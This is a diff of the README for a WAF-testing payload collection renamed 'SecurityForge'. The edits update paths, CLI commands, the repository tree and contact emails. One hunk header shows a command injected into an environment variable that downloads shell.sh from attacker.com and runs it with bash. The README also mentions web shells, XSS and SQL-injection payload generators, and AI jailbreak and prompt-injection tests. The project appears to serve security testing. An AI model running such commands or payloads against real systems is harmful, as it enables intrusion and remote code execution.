@@ -143,7 +143,7 @@ docker-compose up
 
 ### 🔵 Claude Code (Windsurf IDE)
 Step-by-step guide to use SecurityForge with Claude AI directly in your IDE:
-- **[Claude Code Usage Guide →](CLAUDE_CODE_GUIDE.md)**
+- **[Claude Code Usage Guide →](docs/claude-code-guide.md)**
 
 **Quick Start:**
 1. Open SecurityForge in Windsurf IDE
@@ -153,7 +153,7 @@ Step-by-step guide to use SecurityForge with Claude AI directly in your IDE:
 
 ### 💬 ChatGPT
 Step-by-step guide to use SecurityForge with ChatGPT:
-- **[ChatGPT Usage Guide →](CHATGPT_GUIDE.md)**
+- **[ChatGPT Usage Guide →](docs/chatgpt-guide.md)**
 
 **Quick Start:**
 1. Clone SecurityForge repository
@@ -319,12 +319,13 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 
 **Easy payload creation without security expertise:**
 ```bash
-# Interactive mode
-python3 payload_generator.py
+# Via CLI
+securityforge payloads
 
-# Command-line mode
-python3 payload_generator.py xss basic "test"
-python3 payload_generator.py sqli union "users"
+# Or use the generator directly
+python3 securityforge/payload_generator.py
+python3 securityforge/payload_generator.py xss basic "test"
+python3 securityforge/payload_generator.py sqli union "users"
 ```
 
 **Features:**
@@ -340,7 +341,7 @@ python3 payload_generator.py sqli union "users"
 
 ```bash
 # Interactive mode
-python3 easy_payload_creator.py
+python3 securityforge/payload_creator.py
 
 # What you say: "Show an alert saying Hello"
 # What you get: <script>alert("Hello")</script>
@@ -470,10 +471,9 @@ AI security is a **major trend in 2025-2026**. Test your AI applications against
 
 **Example Usage:**
 ```bash
-python3 easy_payload_creator.py
-> "Test DAN jailbreak on ChatGPT"
-> "Extract system prompt from AI"
-> "Inject malicious instructions via email"
+securityforge test https://your-ai-app.com -c ai_prompt_injection --max 20
+# Or use the creator directly
+python3 securityforge/payload_creator.py
 ```
 
 **OWASP LLM Top 10:2025 Coverage (90%):** 🏆
@@ -629,10 +629,11 @@ cat payloads/web_shells/php_shells.txt | grep "China Chopper"
 cat payloads/llm_testing/bias_detection.txt | head -10
 
 # Use with WAF detector
-python3 waf_detector.py -t https://target.com --payloads payloads/xss/
+securityforge detect https://target.com
+securityforge test https://target.com -c xss --max 20
 ```
 
-**[View Complete Coverage Documentation →](PAYLOAD_DATABASE_COVERAGE.md)**
+**[View Complete Coverage Documentation →](docs/payload-database-coverage.md)**
 
 ### 🔒 Responsible Use
 
@@ -729,8 +730,8 @@ Integrate with Claude Code, ChatGPT, and other AI assistants.
 - ✅ **Capsaicin**: AI-generated payloads from security tools
 
 **📖 Complete Guides:**
-- [POC_SIMULATION_GUIDE.md](POC_SIMULATION_GUIDE.md) - **Step-by-step CVE testing tutorials**
-- [CVE_AND_REAL_WORLD_BYPASSES.md](CVE_AND_REAL_WORLD_BYPASSES.md) - Technical deep dive
+- [docs/poc-simulation-guide.md](docs/poc-simulation-guide.md) - **Step-by-step CVE testing tutorials**
+- [docs/cve-real-world-bypasses.md](docs/cve-real-world-bypasses.md) - Technical deep dive
 
 **Sources:** Security researchers on Twitter/X (@pyn3rd, @therceman, @KN0X55, @lu3ky13, @phithon_xg, @NullSecurityX), GitHub security tools (Capsaicin, orwagodfather/XSS-Payloads), and Obsidian Labs AI research.
 
@@ -822,50 +823,36 @@ Unlike general payload collections (SecLists, PayloadsAllTheThings) or complex s
 
 **Perfect for:** Bug bounty hunters, penetration testers, security researchers, and teams who need **focused WAF testing** without the complexity of enterprise tools.
 
-See [VALUE_PROPOSITION.md](VALUE_PROPOSITION.md) for detailed comparison.
+See [docs/](docs/) for detailed documentation.
 
 ## �📁 Repository Structure
 
 ```
-waf-payload-database/
+securityforge/
 ├── README.md                          # This file
 ├── LICENSE                            # MIT License
 ├── CONTRIBUTING.md                    # Contribution guidelines
-├── payloads/
-│   ├── xss/                          # XSS payloads
-│   │   ├── basic.json                # Basic XSS vectors
-│   │   ├── encoded.json              # Encoded XSS payloads
-│   │   ├── obfuscated.json           # Obfuscated XSS
-│   │   ├── polyglot.json             # Polyglot XSS
-│   │   ├── mutation.json             # Mutation XSS (mXSS)
-│   │   ├── dom-based.json            # DOM-based XSS
-│   │   ├── svg-based.json            # SVG XSS vectors
-│   │   ├── event-handlers.json       # Event handler XSS
-│   │   └── advanced.json             # Advanced techniques
-│   ├── sqli/                         # SQL Injection
-│   │   ├── basic.json
-│   │   ├── blind.json
-│   │   ├── time-based.json
-│   │   └── error-based.json
-│   ├── command-injection/            # Command Injection
-│   ├── ssrf/                         # Server-Side Request Forgery
-│   ├── xxe/                          # XML External Entity
-│   ├── path-traversal/               # Path Traversal
-│   ├── ssti/                         # Server-Side Template Injection
-│   ├── open-redirect/                # Open Redirect
-│   ├── encoding/                     # Various encoding techniques
-│   └── research/                     # Research-based payloads
-├── tools/
-│   ├── payload_tester.py             # Automated payload testing tool
-│   ├── classifier.py                 # Payload classification tool
-│   └── analyzer.py                   # Results analysis tool
-├── docs/
-│   ├── methodology.md                # Testing methodology
-│   ├── analysis.md                   # Detailed analysis
-│   ├── techniques.md                 # Bypass techniques explained
-│   └── results.md                    # Complete test results
-└── scripts/
-    └── extract_payloads.py           # Extract payloads from test files
+├── pyproject.toml                     # PyPI package configuration
+├── securityforge/                     # Python package
+│   ├── __init__.py                   # Package init (v3.0.0)
+│   ├── cli.py                        # CLI entry point
+│   ├── detector.py                   # WAF detection engine
+│   ├── tester.py                     # WAF testing engine
+│   ├── reporter.py                   # Report generator
+│   ├── recommender.py                # WAF recommendations
+│   ├── payload_creator.py            # Easy payload creator
+│   ├── payload_generator.py          # Payload generator
+│   └── payloads/                     # 6,100+ attack payloads
+│       ├── xss/                      # XSS payloads (13 files)
+│       ├── sqli/                     # SQL injection
+│       ├── ssrf/                     # SSRF payloads
+│       ├── ai_prompt_injection/      # AI/LLM payloads
+│       └── ...                       # 21 categories total
+├── docs/                              # Documentation (26 guides)
+├── examples/                          # Example scripts
+├── tests/                             # Test suite
+├── waf_detector.py                    # Legacy CLI (still works)
+└── waf_tester.py                      # Legacy CLI (still works)
 ```
 
 ## 🚀 Quick Start
@@ -1101,8 +1088,9 @@ MIT License - See [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact
 
-- Issues: [GitHub Issues](https://github.com/dalisecurity/waf-payload-database/issues)
-- Discussions: [GitHub Discussions](https://github.com/dalisecurity/waf-payload-database/discussions)
+- Issues: [GitHub Issues](https://github.com/dalisecurity/securityforge/issues)
+- Discussions: [GitHub Discussions](https://github.com/dalisecurity/securityforge/discussions)
+- PyPI: [pypi.org/project/securityforge](https://pypi.org/project/securityforge/)
 
 ## 🔗 Related Projects
 
@@ -1125,7 +1113,7 @@ MIT License - See [LICENSE](LICENSE) file for details.
 
 ### How do I test my own WAF?
 
-See our comprehensive [POC_SIMULATION_GUIDE.md](POC_SIMULATION_GUIDE.md) for:
+See our comprehensive [docs/poc-simulation-guide.md](docs/poc-simulation-guide.md) for:
 - Step-by-step CVE testing tutorials
 - Interactive CLI usage examples
 - Automated testing scripts
@@ -1133,7 +1121,9 @@ See our comprehensive [POC_SIMULATION_GUIDE.md](POC_SIMULATION_GUIDE.md) for:
 
 Quick start:
 ```bash
-python3 waf_tester.py -i
+pip install securityforge
+securityforge detect https://yoursite.com
+securityforge test https://yoursite.com -c xss --max 10
 ```
 
 ### Can I contribute payloads?
@@ -1182,7 +1172,7 @@ Results may vary by WAF vendor and configuration.
 ### How do I report a security issue?
 
 **Do NOT open a public issue**. Instead:
-- Email: security@dalisecurity.com
+- Email: soc@dalisec.io
 - See [SECURITY.md](SECURITY.md) for our disclosure policy
 - We follow a 90-day responsible disclosure timeline
 
@@ -1210,10 +1200,10 @@ Use this to:
 
 ### How do I get support?
 
-- **Questions**: [GitHub Discussions](https://github.com/dalisecurity/waf-payload-arsenal/discussions)
-- **Bugs**: [GitHub Issues](https://github.com/dalisecurity/waf-payload-arsenal/issues)
-- **Security**: security@dalisecurity.com
-- **Commercial**: contact@dalisecurity.com
+- **Questions**: [GitHub Discussions](https://github.com/dalisecurity/securityforge/discussions)
+- **Bugs**: [GitHub Issues](https://github.com/dalisecurity/securityforge/issues)
+- **Security**: soc@dalisec.io
+- **Commercial**: soc@dalisec.io
 
 ## 📈 Roadmap
 
@@ -1228,8 +1218,8 @@ Use this to:
 
 ## 🏆 Contributors Wall of Fame
 
-<a href="https://github.com/dalisecurity/waf-payload-arsenal/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=dalisecurity/waf-payload-arsenal" />
+<a href="https://github.com/dalisecurity/securityforge/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=dalisecurity/securityforge" />
 </a>
 
 **Special Thanks:**
